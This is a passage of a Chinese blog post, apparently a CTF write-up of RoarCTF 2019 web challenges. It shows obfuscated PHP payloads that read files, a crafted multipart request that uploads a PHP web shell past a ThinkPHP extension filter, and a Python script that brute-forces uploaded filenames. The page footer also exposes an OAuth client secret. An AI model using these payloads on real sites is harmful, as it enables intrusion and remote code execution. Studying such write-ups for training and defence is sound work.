class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>parse_str过waf或者http请求走私</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dechex() 十进制转换为十六进制</span><br><span class="line">hex2bin() 十六进制转换为ASCII字符</span><br><span class="line">base_convert(num,frombase,tobase) 将num为frombase转换为指定进制tobase</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</p>
+<p>var_dump(scandir(‘/‘))</p>
+</blockquote>
+<p><img src="./1571201776415.png" alt="1571201776415"></p>
+<blockquote>
+<p>readfile(/f1agg)</p>
+<p>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).(f1agg))</p>
+</blockquote>
+<p><img src="./1571201900561.png" alt="1571201900561"></p>
+<p><img src="./1571201983786.png" alt="1571201983786"></p>
+<h1 id="simple-Upload"><a href="#simple-Upload" class="headerlink" title="simple-Upload"></a>simple-Upload</h1><p>题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>上传三个文件缩小时间爆破范围</p>
+<p><code>strstr</code>传入数组<code>warning</code>报错，回显<code>false</code></p>
+<p><img src="./1571108312495.png" alt="1571108312495"></p>
+<p><code>$files</code>为空直接赋值$_FILES变量,<strong>关键处</strong></p>
+<p><img src="./1571109934502.png" alt="1571109934502"></p>
+<p>再处理$files数组，遍历键值对，解放<code>$files</code>二维数组为一维数组</p>
+<p><img src="./1571111012921.png" alt="1571111012921"></p>
+<p>调用配置文件中保存文件处理函数,<strong>uniqid函数</strong></p>
+<p><img src="./1571110449119.png" alt="1571110449119"></p>
+<p><code>call_user_func_arrary</code> 调用<code>uniqid()</code>,生成文件名。</p>
+<p><img src="./1571110604190.png" alt="1571110604190"></p>
+<p>保存文件</p>
+<p><img src="./1571111166570.png" alt="1571111166570"></p>
+<h2 id="uniqid函数"><a href="#uniqid函数" class="headerlink" title="uniqid函数"></a>uniqid函数</h2><p><img src="./1571202207913.png" alt="1571202207913"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>同时上传两个个文件，缩小爆破范围，远程可以上传三个文件更进一步缩小范围</p>
+<p>本地显示爆破后３位就可以，远程需要后5位</p>
+<p><img src="./1571109567467.png" alt="1571109567467"></p>
+<h2 id="文件上传exp"><a href="#文件上传exp" class="headerlink" title="文件上传exp"></a>文件上传exp</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?m=home&amp;c=index&amp;a=upload</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: umgmalytroarctf.4hou.com.cn:32901</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------9130902641497288610839855586</span><br><span class="line"><span class="attribute">Content-Length</span>: 387</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------9130902641497288610839855586</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="as.txt"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); eval($_GET[_]); ?&gt;</span><br><span class="line">-----------------------------9130902641497288610839855586</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name[1]="file"; filename="as.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); eval($_GET[_]); ?&gt;</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="as.txt"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); eval($_GET[_]); ?&gt;</span><br><span class="line">-----------------------------9130902641497288610839855586</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line"><span class="attribute">upload</span></span><br><span class="line"><span class="attribute">-----------------------------9130902641497288610839855586--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="后缀爆破"><a href="#后缀爆破" class="headerlink" title="后缀爆破"></a>后缀爆破</h2><p>实在是太慢了，buuoj对多线程限制，就不爆了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">a&#x3D;&#39;&#39;</span><br><span class="line"># for i in range(0x100,0xfff):</span><br><span class="line">#     url &#x3D; &quot;http:&#x2F;&#x2F;51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82&#x2F;Public&#x2F;Uploads&#x2F;2019-10-15&#x2F;5da5495e5d&quot;+hex(i)[2:]+&#39;.php&#39;</span><br><span class="line">#     rep &#x3D; requests.get(url)</span><br><span class="line">#     print(hex(i)[2:])</span><br><span class="line">#     if &#39;Version&#39; in rep.text:</span><br><span class="line">#         print(url)</span><br><span class="line">#         a+&#x3D;url</span><br><span class="line">#         sys.exit()</span><br><span class="line">#         break</span><br><span class="line">        </span><br><span class="line"># for i in range(0x1000,0xffff):</span><br><span class="line">#     url &#x3D; &quot;http:&#x2F;&#x2F;51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82&#x2F;Public&#x2F;Uploads&#x2F;2019-10-15&#x2F;5da5495e5&quot;+hex(i)[2:]+&#39;.php&#39;</span><br><span class="line">#     rep &#x3D; requests.get(url)</span><br><span class="line">#     print(hex(i)[2:])</span><br><span class="line">#     if &#39;Version&#39; in rep.text:</span><br><span class="line">#         print(url)</span><br><span class="line">#         a+&#x3D;url</span><br><span class="line">#         sys.exit()</span><br><span class="line">#         break</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">for i in range(0x6cd19,0xfffff):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82&#x2F;Public&#x2F;Uploads&#x2F;2019-10-15&#x2F;5da5583e&quot;+hex(i)[2:]+&#39;.php&#39;</span><br><span class="line">    rep &#x3D; requests.get(url)</span><br><span class="line">    print(hex(i)[2:])</span><br><span class="line">    if &#39;Version&#39; in rep.text:</span><br><span class="line">        print(url)</span><br><span class="line">        a+&#x3D;url</span><br><span class="line">        sys.exit()</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">for i in range(0xe6cd19,0xffffff):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82&#x2F;Public&#x2F;Uploads&#x2F;2019-10-15&#x2F;5da5583&quot;+hex(i)[2:]+&#39;.php&#39;</span><br><span class="line">    rep &#x3D; requests.get(url)</span><br><span class="line">    print(hex(i)[2:])</span><br><span class="line">    if &#39;Version&#39; in rep.text:</span><br><span class="line">        print(url)</span><br><span class="line">        a+&#x3D;url</span><br><span class="line">        sys.exit()</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p><a href="https://mp.weixin.qq.com/s?srcid=1016GXIy2HOar4STCzN93JIO&amp;scene=23&amp;sharer_sharetime=1571181198903&amp;mid=2247483858&amp;sharer_shareid=fbbfc02e7625095a3404e2482b0c7a95&amp;sn=19234bf6611400ae9da5d9a49a233cde&amp;idx=1&amp;__biz=MzkwNzAwMDYyNQ%3D%3D&amp;chksm=c0deaf8cf7a9269a32d928617d0c3eb11720914c591e0dc4d017450b9ef3809f2ed6a348a1b8&amp;mpshare=1#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?srcid=1016GXIy2HOar4STCzN93JIO&amp;scene=23&amp;sharer_sharetime=1571181198903&amp;mid=2247483858&amp;sharer_shareid=fbbfc02e7625095a3404e2482b0c7a95&amp;sn=19234bf6611400ae9da5d9a49a233cde&amp;idx=1&amp;__biz=MzkwNzAwMDYyNQ%3D%3D&amp;chksm=c0deaf8cf7a9269a32d928617d0c3eb11720914c591e0dc4d017450b9ef3809f2ed6a348a1b8&amp;mpshare=1#rd</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/">
+        <span class="nav-arrow">← </span>
+        
+          历史漏洞分析之PHPCMS v9.6.0 SQL注入
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/10/17/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E4%B8%80/">
+        
+          HTTP请求走私基础学习(一)
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#simple-calc"><span class="toc-nav-text">simple-calc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#题目源码"><span class="toc-nav-text">题目源码</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#解法一"><span class="toc-nav-text">解法一</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#解法二"><span class="toc-nav-text">解法二</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#simple-Upload"><span class="toc-nav-text">simple-Upload</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#uniqid函数"><span class="toc-nav-text">uniqid函数</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#思路"><span class="toc-nav-text">思路</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#文件上传exp"><span class="toc-nav-text">文件上传exp</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#后缀爆破"><span class="toc-nav-text">后缀爆破</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#wp"><span class="toc-nav-text">wp</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web题解-待补充/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "RoarCTF2019_web题解(待补充)",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
